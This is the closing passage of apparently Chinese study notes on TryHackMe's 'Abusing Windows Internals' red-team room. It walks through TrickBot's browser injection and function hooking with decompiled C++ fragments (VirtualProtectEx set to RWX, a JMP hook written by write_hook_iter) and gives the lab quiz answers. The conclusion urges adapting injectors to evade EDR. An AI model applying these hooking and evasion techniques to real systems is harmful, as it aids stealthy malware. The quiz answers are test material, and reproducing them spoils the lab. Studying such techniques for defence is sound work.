style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦定义了函数指针，恶意软件将使用它们通过<code>VirtualProtectEx</code>来修改函数的内存保护。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualProtectEx</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HANDLE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> trampoline_lpvoid</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> v8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40u</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">flOldProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>此时，代码进入了恶意软件的操作，进行函数指针钩取。理解这段代码的技术要求对于本课程并不是必须的。从本质上讲，这段代码将重写一个钩子，使其指向一个opcode跳转。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">v10 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v11 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">original_function</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x47</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">original_function</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xE9u</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x43</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v10 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> v11</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">write_hook_iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v10</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">jmp_32_bit_relative_offset_opcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// -&gt; 手动写入钩子</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦钩取完成，它将恢复函数的原始内存保护。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">VirtualProtectEx</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">// 恢复原始保护状态</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HANDLE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPVOID </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">original_function</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		flOldProtect</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">flOldProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<hr>
<p>这段代码可能看起来还是有很多技术细节，但这并不重要！TrickBot钩取函数的主要内容是，它会使用反射注入将自己注入到浏览器进程中，并钩取从注入的函数中获取的API调用。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>TrickBot 使用了哪种替代的 Windows API 调用来创建新的用户线程？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RtlCreateUserThread</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>TrickBot采用的注入技术是反射的吗？(y / n)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">y</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>用于手动写入钩子的函数名是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">write_hook_iter</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion---结论">Conclusion - 结论<a href="#conclusion---结论" class="hash-link" aria-label="Direct link to Conclusion - 结论" title="Direct link to Conclusion - 结论">​</a></h2>
<p>进程注入是一种广泛的技术，可以以多种方式使用，是滥用 Windows 内部结构的最常见方式之一。</p>
<p>需要注意的是，随着检测工程和监控技术的进步，注入技术也需要不断发展。本室展示的大多数技术都可以被流行的商业 EDR（终端检测与响应）检测到，但你仍然可以轻松修改注入器，以应对红队与蓝队之间的“猫捉老鼠”游戏。</p>
<p>在准备将注入技术集成到自己的工作或工具中时，我们建议将其作为更大工具的一小部分使用。混合和匹配注入的组件也可以非常有利，尝试使你的工具尽可能接近合法应用程序。</p>
<p>将这些技术加入你的规避工具箱，并继续进行实验，找出最适合你所处环境的方法。</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/PgUp-code/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Introduction to Windows API - Windows API简介"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Introduction to Windows API - Windows API简介</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Introduction to Antivirus - 防病毒简介"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Introduction to Antivirus - 防病毒简介</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction---简介" class="table-of-contents__link toc-highlight">Introduction - 简介</a><ul><li><a href="#学习目标" class="table-of-contents__link toc-highlight">学习目标</a></li></ul></li><li><a href="#abusing-processes---滥用进程机制" class="table-of-contents__link toc-highlight">Abusing Processes - 滥用进程机制</a></li><li><a href="#expanding-process-abuse---扩展进程滥用" class="table-of-contents__link toc-highlight">Expanding Process Abuse - 扩展进程滥用</a></li><li><a href="#abusing-process-components---滥用进程组件" class="table-of-contents__link toc-highlight">Abusing Process Components - 滥用进程组件</a></li><li><a href="#abusing-dlls---滥用-dlls" class="table-of-contents__link toc-highlight">Abusing DLLs - 滥用 DLLs</a></li><li><a href="#memory-execution-alternatives---内存执行替代方案" class="table-of-contents__link toc-highlight">Memory Execution Alternatives - 内存执行替代方案</a><ul><li><a href="#调用函数指针invoking-function-pointers" class="table-of-contents__link toc-highlight"><strong>调用函数指针（Invoking Function Pointers）</strong></a></li><li><a href="#异步过程调用asynchronous-procedure-callsapc" class="table-of-contents__link toc-highlight"><strong>异步过程调用（Asynchronous Procedure Calls，APC）</strong></a></li><li><a href="#节section操作section-manipulation" class="table-of-contents__link toc-highlight"><strong>节（Section）操作（Section Manipulation）</strong></a></li></ul></li><li><a href="#case-study-in-browser-injection-and-hooking---浏览器注入与挂钩的案例分析" class="table-of-contents__link toc-highlight">Case Study in Browser Injection and Hooking - 浏览器注入与挂钩的案例分析</a></li><li><a href="#conclusion---结论" class="table-of-contents__link toc-highlight">Conclusion - 结论</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">No Copyright © 2025 This is just PgDn's Notes, Sorry. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>